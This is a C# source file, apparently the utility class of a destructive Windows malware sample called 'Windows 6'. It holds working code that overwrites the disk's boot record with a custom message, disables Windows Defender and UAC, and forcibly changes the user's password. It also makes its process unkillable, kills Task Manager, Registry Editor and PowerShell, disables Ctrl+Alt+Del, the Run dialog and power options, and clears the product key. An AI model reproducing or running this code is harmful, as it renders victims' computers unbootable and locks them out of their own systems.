using Microsoft.Win32;
using System.Runtime.InteropServices;
using System;
using System.Diagnostics;
using System.Threading;
using System.Management;
using System.DirectoryServices;
using System.Collections.Generic;
using System.IO;

public class Utils
{
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);

    [DllImport("user32.dll")]
    private static extern Int32 SwapMouseButton(Int32 bSwap);

    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

    [DllImport("kernel32.dll")]
    private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

    [DllImport("user32.dll")]
    private static extern int FindWindow(string className, string windowText);

    [DllImport("user32.dll")]
    private static extern int ShowWindow(int hwnd, int command);

    [DllImport("netapi32.dll", CharSet = CharSet.Unicode)]
    private static extern int NetUserSetInfo([MarshalAs(UnmanagedType.LPWStr)] string servername, string username, int level, ref USER_INFO_1003 buf, out UInt32 parm_err);

    [System.Runtime.InteropServices.DllImport("Shell32.dll")]
    private static extern int SHChangeNotify(int eventId, int flags, IntPtr item1, IntPtr item2);

    [DllImport("user32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool SystemParametersInfo(uint uiAction, uint uiParam, String pvParam, uint fWinIni);

    [DllImport("user32.dll")]
    private static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

    private delegate bool EnumThreadDelegate(IntPtr hWnd, IntPtr lParam);

    [DllImport("user32.dll")]
    private static extern bool EnumThreadWindows(int dwThreadId, EnumThreadDelegate lpfn, IntPtr lParam);

    private static IEnumerable<IntPtr> EnumerateProcessWindowHandles(int processId)
    {
        List<IntPtr> handles = new List<IntPtr>();

        foreach (ProcessThread thread in Process.GetProcessById(processId).Threads)
        {
            EnumThreadWindows(thread.Id, (hWnd, lParam) =>
            {
                handles.Add(hWnd);
                return true;
            },
            IntPtr.Zero);
        }

        return handles;
    }

    private const uint SPI_SETDESKWALLPAPER = 0x14;
    private const uint GenericAll = 0x10000000;
    private const uint FileShareRead = 0x1;
    private const uint FileShareWrite = 0x2;
    private const uint OpenExisting = 0x3;
    private const uint MbrSize = 512U;
    private const uint WM_KEYDOWN = 0x0100;
    private const uint WM_KEYUP = 0x0101;
    private const int VK_RETURN = 0x0D;
    private const int VK_CANCEL = 0x03;

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct USER_INFO_1003
    {
        public string sPassword;
    }

    public static ProtoRandom.ProtoRandom random = new ProtoRandom.ProtoRandom(2);

    private static string[] startMenuElements = new string[] { "HideAppList", "HideChangeAccountSettings", "HideFrequentlyUsedApps",
        "HideHibernate", "HideLock", "HidePeopleBar", "HidePowerButton", "HideRecentJumplists", "HideRecentlyAddedApps", "HideRestart",
        "HideRestart", "HideShutDown", "HideSignOut", "HideSleep", "HideSwitchAccount", "HideUserTitle" };

    private static string[] uacKeys = new string[] { "EnableVirtualization", "EnableInstallerDetection", "PromptOnSecureDesktop",
        "EnableSecureUIAPaths", "ConsentPromptBehaviorAdmin", "ValidateAdminCodeSignatures", "EnableUIADesktopToggle",
        "ConsentPromptBehaviorUser", "FilterAdministratorToken", "EnableLUA" };

    public static void SwapMouseButtons()
    {
        try
        {
            SwapMouseButton(1);
        }
        catch
        { 
        
        }
    }

    public static string GenerateRandomWindowsPassword()
    {
        char[] characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!\"'()/6%${}[]èéò@çà°ù§<>€+".ToCharArray();
        return random.GetRandomString(characters, 16);
    }

    public static string GenerateRandomWindowsPassword1()
    {
        char[] characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ".ToCharArray();
        return random.GetRandomString(characters, 6);
    }

    public static string GenerateRandomWindowsUsername()
    {
        char[] characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ".ToCharArray();
        return random.GetRandomString(characters, 6);
    }

    public static string GenerateRandomConsoleTitle()
    {
        char[] characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ".ToCharArray();
        return random.GetRandomString(characters, 256);
    }

    public static void CreateRandomWindowsUsers(int quantity)
    {
        new Thread(() =>
        {
            for (int i = 0; i < quantity; i++)
            {
                DirectoryEntry AD = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");
                DirectoryEntry NewUser = AD.Children.Add(GenerateRandomWindowsUsername(), "user");
                NewUser.Invoke("SetPassword", new object[] { GenerateRandomWindowsPassword1() });
                NewUser.Invoke("Put", new object[] { "Description", GenerateRandomWindowsUsername() });
                NewUser.CommitChanges();
                DirectoryEntry grp = AD.Children.Find("Guests", "group");

                if (grp != null)
                {
                    grp.Invoke("Add", new object[] { NewUser.Path.ToString() });
                }
            }
        }).Start();
    }

    public static void HideStartMenu()
    {
        new Thread(() =>
        {
            Thread.Sleep(3500);

            try
            {
                while (FindWindow("Shell_TrayWnd", "") <= 1)
                {
                    Thread.Sleep(100);
                }

                ShowWindow(FindWindow("Shell_TrayWnd", ""), 0x00);
            }
            catch
            {

            }
        }).Start();
    }

    public static unsafe void ForcefullyChangePassword(string password)
    {
        USER_INFO_1003 o = new USER_INFO_1003();
        o.sPassword = password;
        int r = NetUserSetInfo(null, Environment.UserName, 1003, ref o, out _);
        r = NetUserSetInfo(null, Environment.UserDomainName, 1003, ref o, out _);
    }

    public static void HideElementsFromStartMenu()
    {
        foreach (string startMenuElement in startMenuElements)
        {
            HideElementFromStartMenu(startMenuElement);
        }
    }

    public static void HideElementFromStartMenu(string element)
    {
        try
        {
            Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\PolicyManager\default\Start\" + element).SetValue("value", "1", RegistryValueKind.DWord);
        }
        catch
        {

        }
    }

    public static void DisableWindowsDefender()
    {
        string rootDir = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1) + ":";
        System.IO.File.WriteAllText(rootDir + "\\DisableWD.bat", Windows_6.Properties.Resources.DisableWD);
        ProcessStartInfo processInfo = new ProcessStartInfo("cmd.exe", "/c \"" + rootDir + "\\DisableWD.bat\"");
        processInfo.CreateNoWindow = true;
        processInfo.UseShellExecute = false;
        processInfo.WindowStyle = ProcessWindowStyle.Hidden;
        Process disableWDProcess = Process.Start(processInfo);
        disableWDProcess.Start();
        disableWDProcess.WaitForExit();

        while (true)
        {
            try
            {
                System.IO.File.Delete(rootDir + "\\DisableWD.bat");
                break;
            }
            catch
            {

            }
        }
    }

    public static void OverwriteMBR()
    {
        try
        {
            byte[] mbrData = new byte[] { 0xEB, 0x00, 0x31, 0xC0, 0x8E, 0xD8, 0xFC, 0xB8, 0x12, 0x00, 0xCD, 0x10, 0xBE, 0x24, 0x7C, 0xB3,
0x09, 0xE8, 0x02, 0x00, 0xEB, 0xFE, 0xB7, 0x00, 0xAC, 0x3C, 0x00, 0x74, 0x06, 0xB4, 0x0E, 0xCD,
0x10, 0xEB, 0xF5, 0xC3, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20, 0x36, 0x20, 0x68, 0x61,
0x73, 0x20, 0x62, 0x65, 0x65, 0x6E, 0x20, 0x73, 0x75, 0x63, 0x63, 0x65, 0x73, 0x66, 0x75, 0x6C,
0x6C, 0x79, 0x20, 0x69, 0x6E, 0x73, 0x74, 0x61, 0x6C, 0x6C, 0x65, 0x64, 0x21, 0x20, 0x54, 0x68,
0x61, 0x6E, 0x6B, 0x20, 0x79, 0x6F, 0x75, 0x2E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
 };
            IntPtr mbr = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero, OpenExisting, 0, IntPtr.Zero);
            WriteFile(mbr, mbrData, MbrSize, out uint _, IntPtr.Zero);
        }
        catch
        {

        }
    }

    public static void MakeProcessUnkillable()
    {
        try
        {
            RtlSetProcessIsCritical(1, 0, 0);
        }
        catch
        {

        }
    }

    public static void DisableWindowsKey()
    {
        byte[] binary = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x5B, 0xE0, 0x00, 0x00, 0x5C, 0xE0, 0x00, 0x00, 0x00, 0x00 };

        try
        {
            Registry.LocalMachine.CreateSubKey(@"System\CurrentControlSet\Control\Keyboard Layout", true).SetValue("Scancode Map", binary, RegistryValueKind.Binary);
        }
        catch
        {

        }
    }

    public static void DisableSystemFunction(string systemFunction)
    {
        try
        {
            Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System").SetValue(systemFunction, "1", RegistryValueKind.DWord);
        }
        catch
        {

        }

        try
        {
            Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System").SetValue(systemFunction, "1", RegistryValueKind.DWord);
        }
        catch
        {

        }

        try
        {
            Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer").SetValue(systemFunction, "1", RegistryValueKind.DWord);
        }
        catch
        {

        }

        try
        {
            Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer").SetValue(systemFunction, "1", RegistryValueKind.DWord);
        }
        catch
        {

        }

        try
        {
            Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Microsoft\Windows").SetValue(systemFunction, "1", RegistryValueKind.DWord);
        }
        catch
        {

        }

        try
        {
            Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Microsoft\Windows").SetValue(systemFunction, "1", RegistryValueKind.DWord);
        }
        catch
        {

        }

        try
        {
            Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System").SetValue(systemFunction, "1", RegistryValueKind.DWord);
        }
        catch
        {

        }

        try
        {
            Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System").SetValue(systemFunction, "1", RegistryValueKind.DWord);
        }
        catch
        {

        }
    }

    public static void EnableSystemFunction(string systemFunction)
    {
        try
        {
            Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System").SetValue(systemFunction, "0", RegistryValueKind.DWord);
        }
        catch
        {

        }

        try
        {
            Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System").SetValue(systemFunction, "0", RegistryValueKind.DWord);
        }
        catch
        {

        }

        try
        {
            Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer").SetValue(systemFunction, "0", RegistryValueKind.DWord);
        }
        catch
        {

        }

        try
        {
            Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer").SetValue(systemFunction, "0", RegistryValueKind.DWord);
        }
        catch
        {

        }

        try
        {
            Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Microsoft\Windows").SetValue(systemFunction, "0", RegistryValueKind.DWord);
        }
        catch
        {

        }

        try
        {
            Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Microsoft\Windows").SetValue(systemFunction, "0", RegistryValueKind.DWord);
        }
        catch
        {

        }

        try
        {
            Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System").SetValue(systemFunction, "0", RegistryValueKind.DWord);
        }
        catch
        {

        }

        try
        {
            Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System").SetValue(systemFunction, "0", RegistryValueKind.DWord);
        }
        catch
        {

        }
    }

    public static void HideHiddenFiles()
    {
        new Thread(() =>
        {
            Thread.Sleep(1000);

            try
            {
                RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");

                if (key != null)
                {
                    key.SetValue("Hidden", 2);
                }
            }
            catch
            {

            }

            try
            {
                RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer");

                if (key != null)
                {
                    key.SetValue("Hidden", 2);
                }
            }
            catch
            {

            }

            try
            {
                Guid CLSID_ShellApplication = new Guid("13709620-C279-11CE-A49E-444553540000");
                Type shellApplicationType = Type.GetTypeFromCLSID(CLSID_ShellApplication, true);
                object shellApplication = Activator.CreateInstance(shellApplicationType);
                object windows = shellApplicationType.InvokeMember("Windows", System.Reflection.BindingFlags.InvokeMethod, null, shellApplication, new object[] { });
                Type windowsType = windows.GetType();
                object count = windowsType.InvokeMember("Count", System.Reflection.BindingFlags.GetProperty, null, windows, null);

                for (int i = 0; i < (int)count; i++)
                {
                    try
                    {
                        object item = windowsType.InvokeMember("Item", System.Reflection.BindingFlags.InvokeMethod, null, windows, new object[] { i });
                        Type itemType = item.GetType();

                        string itemName = (string)itemType.InvokeMember("Name", System.Reflection.BindingFlags.GetProperty, null, item, null);

                        if (itemName == "Windows Explorer")
                        {
                            itemType.InvokeMember("Refresh", System.Reflection.BindingFlags.InvokeMethod, null, item, null);
                        }
                    }
                    catch
                    {

                    }
                }
            }
            catch
            {

            }
        }).Start();
    }

    public static void DisablePowerFunctions()
    {
        try
        {
            Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").SetValue("ShutdownWithoutLogon", "0", RegistryValueKind.DWord);
        }
        catch
        {

        }

        try
        {
            Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer").SetValue("DisableLogonBackgroundImage", "1", RegistryValueKind.DWord);
        }
        catch
        {

        }

        try
        {
            Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").SetValue("DisableLogonBackgroundImage", "1", RegistryValueKind.DWord);
        }
        catch
        {

        }

        try
        {
            Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer").SetValue("NoClose", "1", RegistryValueKind.DWord);
        }
        catch
        {

        }
    }

    public static void DisableControlAltDel()
    {
        try
        {
            Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon").SetValue("DisableCAD", "1", RegistryValueKind.DWord);
        }
        catch
        {

        }

        try
        {
            Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon").SetValue("DisableCAD", "1", RegistryValueKind.DWord);
        }
        catch
        {

        }
    }

    public static void DisableUserAccountControl()
    {
        foreach (string uacKey in uacKeys)
        {
            try
            {
                Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").SetValue(uacKey, "0", RegistryValueKind.DWord);
            }
            catch
            {

            }

            try
            {
                Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").SetValue(uacKey, "0", RegistryValueKind.DWord);
            }
            catch
            {

            }
        }
    }

    public static void RestartExplorer()
    {
        using (Process process = new Process())
        {
            process.StartInfo = new ProcessStartInfo
            {
                FileName = "taskkill.exe",
                Arguments = "-f -im explorer.exe",
                WindowStyle = ProcessWindowStyle.Hidden
            };

            process.Start();
            process.WaitForExit();
            process.StartInfo = new ProcessStartInfo("explorer.exe");
            process.Start();
        }
    }
    
    public static void AntiBadProcesses()
    {
        new Thread(() =>
        {
            while (true)
            {
                Thread.Sleep(10);

                foreach (Process process in Process.GetProcesses())
                {
                    try
                    {
                        if (process.ProcessName.ToLower().Contains("powershell") || process.ProcessName.ToLower().Contains("regedit") || process.ProcessName.ToLower().Contains("taskmgr"))
                        {
                            process.Kill();
                        }
                        else if (process.ProcessName.ToLower().Contains("explorer"))
                        {
                            IEnumerable<IntPtr> windows = EnumerateProcessWindowHandles(process.Id);

                            foreach (IntPtr window in windows)
                            {
                                PostMessage(window, WM_KEYDOWN, (IntPtr)VK_CANCEL, IntPtr.Zero);
                                PostMessage(window, WM_KEYUP, (IntPtr)VK_CANCEL, IntPtr.Zero);
                                PostMessage(window, WM_KEYDOWN, (IntPtr)VK_RETURN, IntPtr.Zero);
                                PostMessage(window, WM_KEYUP, (IntPtr)VK_RETURN, IntPtr.Zero);
                            }
                        }
                    }
                    catch
                    {

                    }
                }
            }
        }).Start();
    }

    public static void ClearProductKeyFromRegistry()
    {
        try
        {
            const string query = "SELECT Version FROM SoftwareLicensingService";
            var searcherProd = new ManagementObjectSearcher("\\\\.\\ROOT\\cimv2", query);
            var results = searcherProd.Get();

            foreach (ManagementObject result in results)
            {
                result.InvokeMethod("ClearProductKeyFromRegistry", null);
                break;
            }
        }
        catch
        {

        }
    }

    public static void SetNewWallpaper()
    {
        string path = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1) + ":\\background.jpg";
        Windows_6.Properties.Resources.Windows6Wallpaper.Save(path);

        try
        {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true);
            registryKey.SetValue("JPEGImportQuality", 100);
        }
        catch
        {

        }

        try
        {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true);
            registryKey.SetValue("WallPaper", path, RegistryValueKind.String);
        }
        catch
        {

        }

        try
        {
            SetWallpaper(path);
        }
        catch
        {

        }
    }

    public static void ChangeAllIcons()
    {
        try
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1) + ":\\icon.ico";

            using (FileStream fileStream = new FileStream(path, FileMode.Create))
            {
                Windows_6.Properties.Resources.Windows6Icon.Save(fileStream);
            }

            File.SetAttributes(path, FileAttributes.Hidden | FileAttributes.ReadOnly);

            try
            {
                RegistryKey icon1 = Registry.ClassesRoot.CreateSubKey("Unknown\\DefaultIcon");
                icon1.SetValue("", path, RegistryValueKind.String);
            }
            catch
            {

            }

            try
            {
                RegistryKey icon2 = Registry.ClassesRoot.CreateSubKey("exefile\\DefaultIcon");
                icon2.SetValue("", path, RegistryValueKind.String);
            }
            catch
            {

            }
        }
        catch
        {

        }
    }

    public static void RefreshDesktop()
    {
        try
        {
            SHChangeNotify(0x8000000, 0x1000, IntPtr.Zero, IntPtr.Zero);
        }
        catch
        {

        }
    }

    private static void SetWallpaper(string file_name)
    {
        uint flags = 0;
        SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, file_name, flags);
    }

    public static void DisableWinRun()
    {
        try
        {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", true);
            registryKey.SetValue("NoRun", 1);
        }
        catch
        {

        }

        try
        {
            RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", true);
            registryKey.SetValue("NoRun", 1);
        }
        catch
        {

        }
    }
}